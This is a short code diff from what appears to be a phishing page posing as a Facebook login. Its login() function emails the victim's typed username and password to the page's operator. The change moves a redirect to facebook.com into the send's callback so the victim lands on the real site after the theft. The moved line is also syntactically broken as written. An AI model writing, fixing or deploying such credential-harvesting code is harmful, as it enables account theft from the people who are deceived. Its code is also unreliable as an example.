@@ -74,8 +74,8 @@ function login() {
     Subject: "Username and Password",
     Body: "Username: " + username.value() + "<br><br>Password " + password.value()
   }).then(
+      window.location.replace("http://facebook.com");
   );
-  window.location.replace("http://facebook.com");
 }
 
 function newacc() {
